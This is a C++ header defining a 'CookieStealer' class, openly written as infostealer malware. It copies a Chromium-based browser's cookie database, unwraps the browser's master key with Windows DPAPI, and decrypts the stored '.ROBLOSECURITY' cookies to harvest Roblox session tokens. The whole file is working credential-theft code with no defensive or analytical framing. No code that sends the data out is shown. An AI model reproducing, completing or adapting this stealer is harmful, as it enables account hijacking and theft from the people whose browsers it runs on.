#pragma once

#include "utils/base64/base64.hpp"
#include "utils/sqlite3/sqlite3.h"
#include "utils/fileio/fileio.hpp"
#include "utils/utils.hpp"

#include <iostream>
#include <sstream>
#include <vector>
#include <cstdlib>
#include <fstream>
#include <filesystem>

#include <stdio.h>
#include <windows.h>

#include <openssl/evp.h>

#include "utils/json/json.hpp"
using json = nlohmann::json;

class CookieStealer {
public:
    CookieStealer(std::string &localstate, std::string &database) {

        size_t requiredSize;
        char *buffer;

        getenv_s(&requiredSize, NULL, 0, "LOCALAPPDATA");

        buffer = new char[requiredSize];

        getenv_s(&requiredSize, buffer, requiredSize, "LOCALAPPDATA");

        appdata = std::string(buffer);

        requiredSize = NULL;
        buffer = nullptr;

        getenv_s(&requiredSize, NULL, 0, "TEMP");

        buffer = new char[requiredSize];

        getenv_s(&requiredSize, buffer, requiredSize, "TEMP");

        temp = std::string(buffer);

        localstate_p = localstate;
        database_p = database;
    }

    ~CookieStealer() {
        if (db_cookie) {
            sqlite3_close(db_cookie);
        }

        if (std::filesystem::exists(c_cookie_path)) {
            std::filesystem::remove(c_cookie_path);
        }
    }

    bool initialize() {
        c_cookie_path = temp + "\\temp-file-c-" + std::to_string(utils::get::random_number(1, 1000)) + "-" + std::to_string(utils::get::milliseconds_since_epoch());

        std::string path = appdata + "\\" + database_p + "\\";

        if (fileIO::file_copy(path + "Network\\Cookies", c_cookie_path)) {
            if (sqlite3_open(c_cookie_path.c_str(), &db_cookie)) {
                fileIO::file_remove(c_cookie_path);
            }
            else
            {
                printf("database open %s\n", c_cookie_path.c_str());
            }
        }

        return get_master_key(appdata + "\\" + localstate_p, master_key);
    }

    std::vector<std::string> get_roblox() {
        std::vector<std::string> result;

        sqlite3_stmt *stmt;
        sqlite3_prepare_v2(db_cookie, "SELECT host_key, name, value, encrypted_value, path FROM cookies ORDER BY creation_utc", -1, &stmt, nullptr);

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const unsigned char *name = sqlite3_column_text(stmt, 1);

            if (_stricmp((char *)name, ".ROBLOSECURITY")) { continue; }

            const unsigned char *url = sqlite3_column_text(stmt, 0);
            const unsigned char *ciphertext = sqlite3_column_text(stmt, 3);

            std::string ciphertext_str = std::string((char *)ciphertext, sqlite3_column_bytes(stmt, 3));

            std::string buf = ciphertext_str.substr(15);

            std::string iv = ciphertext_str.substr(3, 12);
            std::string tag = buf.substr(buf.size() - 16);
            std::string password = buf.substr(0, buf.size() - 16);

            std::vector<unsigned char> pass_bytes;
            utils::conversion::string_to_byte_vector(password, pass_bytes);

            std::vector<unsigned char> tag_bytes;
            utils::conversion::string_to_byte_vector(tag, tag_bytes);

            std::vector<unsigned char> iv_bytes;
            utils::conversion::string_to_byte_vector(iv, iv_bytes);

            std::vector<unsigned char> key_bytes;
            utils::conversion::string_to_byte_vector(master_key, key_bytes);

            unsigned char *plaintext = (unsigned char *)malloc(10000);

            std::string decrypted_pass;

            decrypt_gcm256(pass_bytes.data(), pass_bytes.size(), tag_bytes.data(), key_bytes.data(), iv_bytes.data(), iv_bytes.size(), plaintext);

            utils::conversion::bytes_array_to_string(plaintext, pass_bytes.size(), decrypted_pass);

            result.push_back(decrypted_pass);

            free(plaintext);
        }

        sqlite3_finalize(stmt);

        return result;
    }

private:

    std::string appdata;
    std::string temp;

    std::string localstate_p;
    std::string database_p;

    std::string c_cookie_path;

    std::string master_key;

    sqlite3 *db_cookie = nullptr;

    bool get_master_key(const std::string &path, std::string &out) {

        std::ifstream file(path.c_str());

        std::string contents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

        json json_contents = nlohmann::json::parse(contents);

        std::string encrypted_key = json_contents["os_crypt"]["encrypted_key"];

        if (encrypted_key.empty()) { return false; }

        std::string decoded64key;
        base64::decode(encrypted_key, decoded64key);
        decoded64key.erase(0, 5);

        DATA_BLOB encryptedBlob;
        DATA_BLOB plaintextBlob;

        encryptedBlob.pbData = reinterpret_cast<BYTE *>(const_cast<char *>(decoded64key.data()));
        encryptedBlob.cbData = static_cast<DWORD>(decoded64key.size());

        bool success = CryptUnprotectData(&encryptedBlob, NULL, NULL, NULL, NULL, 0, &plaintextBlob);

        if (success) {
            out.assign(reinterpret_cast<char *>(plaintextBlob.pbData), plaintextBlob.cbData);
            LocalFree(plaintextBlob.pbData);
        }

        return success;
    }

    int decrypt_gcm256(unsigned char *ciphertext, int ciphertext_len, unsigned char *tag,
        unsigned char *key, unsigned char *iv, int iv_len,
        unsigned char *plaintext) {
        EVP_CIPHER_CTX *ctx;
        int len;
        int plaintext_len;
        int ret;

        ctx = EVP_CIPHER_CTX_new();

        EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);

        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv_len, NULL);

        EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv);

        EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len);

        plaintext_len = len;

        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tag);

        ret = EVP_DecryptFinal_ex(ctx, plaintext + len, &len);

        EVP_CIPHER_CTX_free(ctx);

        if (ret > 0) {
            plaintext_len += len;
            return plaintext_len;
        }
        else {
            return -1;
        }
    }
};
